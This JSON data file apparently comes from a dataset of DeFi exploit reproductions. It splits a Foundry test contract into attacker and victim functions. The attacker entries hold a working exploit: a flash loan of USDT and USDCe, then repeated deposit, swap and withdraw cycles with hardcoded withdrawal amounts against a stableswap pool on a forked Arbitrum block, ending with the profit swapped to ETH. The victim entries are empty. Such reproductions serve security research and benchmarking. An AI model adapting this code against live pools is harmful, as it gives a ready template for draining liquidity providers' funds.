[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] calldata tokens,\n        uint256[] calldata amounts,\n        uint256[] calldata feeAmounts,\n        bytes calldata userData\n    ) external {\n        USDT.approve(address(Pool), type(uint256).max);\n        USDCe.approve(address(Pool), type(uint256).max);\n        USDT_LP.approve(address(Pool), type(uint256).max);\n        USDC_LP.approve(address(Pool), type(uint256).max);\n\n        uint256[] memory potentialWithdraws = new uint256[](10);\n        potentialWithdraws[0] = 262_774_935_488;\n        potentialWithdraws[1] = 281_538_919_198;\n        potentialWithdraws[2] = 289_459_196_390;\n        potentialWithdraws[3] = 297_534_181_283;\n        potentialWithdraws[4] = 311_074_071_725;\n        potentialWithdraws[5] = 329_085_528_111;\n        potentialWithdraws[6] = 350_236_264_578;\n        potentialWithdraws[7] = 374_148_346_983;\n        potentialWithdraws[8] = 400_443_817_669;\n        potentialWithdraws[9] = 428_928_171_469;\n\n        uint8 i;\n        while (i < 10) {\n            uint256 amountDeposit1 = USDCe.balanceOf(address(USDC_LP)) * 2;\n            uint256 amountDeposit2 = USDT.balanceOf(address(USDT_LP)) * 3;\n            uint256 amountSwap1 = amountDeposit2 - amountDeposit2 / 3;\n            uint256 diffUSDT = USDT.balanceOf(address(this)) - amountDeposit1;\n            uint256 diffUSDCe = USDCe.balanceOf(address(this)) - amountDeposit2;\n\n            deposit(address(USDT), amountDeposit1);\n            deposit(address(USDCe), amountDeposit2 / 3);\n            Pool.swap(address(USDCe), address(USDT), amountSwap1, 0, address(this), block.timestamp + 1000);\n\n            // Not working logic. I leave this for the future update\n            // uint256 liquidity = USDT_LP.balanceOf(address(this));\n            // uint8 j;\n            // while (j < 20) {\n            //     uint256 doubledLiquidity = liquidity * 2;\n            //     liquidity = doubledLiquidity >> 1;\n            //     Pool.quotePotentialWithdraw(address(USDT), liquidity);\n            //     ++j;\n            // }\n\n            withdraw(address(USDT), potentialWithdraws[i]);\n\n            uint256 fromAmountUSDT = (USDT.balanceOf(address(this)) - diffUSDT) * 3;\n            Pool.swap(address(USDT), address(USDCe), fromAmountUSDT >> 2, 0, address(this), block.timestamp + 1000);\n\n            withdraw(address(USDT), USDT_LP.balanceOf(address(this)));\n\n            uint256 fromAmountUSDCe = (USDCe.balanceOf(address(this)) - diffUSDCe);\n            Pool.swap(address(USDCe), address(USDT), fromAmountUSDCe >> 1, 0, address(this), block.timestamp);\n\n            withdraw(address(USDCe), USDC_LP.balanceOf(address(this)));\n            ++i;\n        }\n        USDT.transfer(address(Vault), amounts[0]);\n        USDCe.transfer(address(Vault), amounts[1]);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"arbitrum\", 140_129_166);\n        vm.label(address(USDT), \"USDT\");\n        vm.label(address(USDCe), \"USDCe\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(Vault), \"Vault\");\n        vm.label(address(USDT_LP), \"USDT_LP\");\n        vm.label(address(USDC_LP), \"USDC_LP\");\n        vm.label(address(Pool), \"Pool\");\n        vm.label(address(SushiRouter), \"SushiRouter\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(this), 0 ether);\n        USDT.approve(address(SushiRouter), type(uint256).max);\n        USDCe.approve(address(SushiRouter), type(uint256).max);\n\n        address[] memory tokens = new address[](2);\n        tokens[0] = address(USDT);\n        tokens[1] = address(USDCe);\n        uint256[] memory amounts = new uint256[](2);\n        amounts[0] = USDCe.balanceOf(address(USDC_LP)) * 2;\n        amounts[1] = USDT.balanceOf(address(USDT_LP)) * 3;\n\n        Vault.flashLoan(address(this), tokens, amounts, abi.encode(1));\n        swapTokensSushi(USDT, USDT.balanceOf(address(this)));\n        swapTokensSushi(USDCe, USDCe.balanceOf(address(this)));\n\n        emit log_named_decimal_uint(\"Attacker ETH balance after exploit\", address(this).balance, 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPool",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPool",
    "source_type": "victim_contract",
    "function_name": "quotePotentialWithdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPool",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPool",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  }
]